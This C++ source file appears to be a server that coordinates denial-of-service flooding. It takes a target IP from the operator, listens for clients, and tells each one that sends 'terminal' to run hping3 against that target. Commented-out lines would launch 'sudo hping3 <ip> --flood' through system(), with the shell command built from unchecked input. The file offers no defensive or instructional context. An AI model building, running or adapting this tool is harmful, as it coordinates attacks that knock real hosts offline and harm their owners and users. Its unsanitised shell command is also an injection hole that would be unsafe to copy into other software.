#include <iostream>
#include <thread>
#include <cstring>
#include <unistd.h>       
#include <arpa/inet.h>    
#include <sys/socket.h>
#include <netinet/in.h>
#include <cstdlib>        
#include <sstream>

using namespace std;

static int PORT = 45444;
int serverSocket;

void handleClient(int clientSocket, const string& ipAddress) {
    char buffer[4096];
    memset(buffer, 0, 4096);

    int bytesReceived = recv(clientSocket, buffer, 4096, 0);
    if (bytesReceived > 0) 
    {
        string request(buffer, bytesReceived);
        if (request == "terminal") 
        {
            // cout << "Running hping3 with IP: " << ipAddress << endl;
            // string hpingCommand = "sudo hping3 " + ipAddress + " --flood > /dev/null 2>&1 &";
            // system(hpingCommand.c_str());
            // string response = "Request received. Running hping3 on " + ipAddress;
            // send(clientSocket, response.c_str(), response.size(), 0);
            cout << "Client requested to run hping3." << endl;
            string response = "Please run hping3 on " + ipAddress;
            send(clientSocket, response.c_str(), response.size(), 0);
        }
    }

    close(clientSocket);
}

int main() {
    system("clear");
    cout << "Connecting to clients...\n" << endl;

    string ipAddress;
    cout << "Enter the target IP address for hping3: ";
    cin >> ipAddress;

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == -1) 
    {
        cerr << "Error creating socket!" << endl;
        return -1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(PORT);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) 
    {
        cerr << "Bind failed! Error: " << strerror(errno) << endl;
        close(serverSocket);  
        return -1;
    }

    if (listen(serverSocket, 10) < 0) 
    {
        cerr << "Listen failed! Error: " << strerror(errno) << endl;
        close(serverSocket);
        return -1;
    }

    cout << "Server listening on port: " << PORT << endl;

    while (true) 
    {
        sockaddr_in clientAddr;
        socklen_t clientSize = sizeof(clientAddr);
        int clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientSize);

        if (clientSocket < 0) 
        {
            cerr << "Failed to accept connection! Error: " << strerror(errno) << endl;
            continue;
        }

        char clientIP[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &clientAddr.sin_addr, clientIP, INET_ADDRSTRLEN);
        cout << "Client connected from " << clientIP << ":" << ntohs(clientAddr.sin_port) << endl;

        thread clientThread(handleClient, clientSocket, ipAddress);
        clientThread.detach();
    }

    close(serverSocket);
    return 0;
}

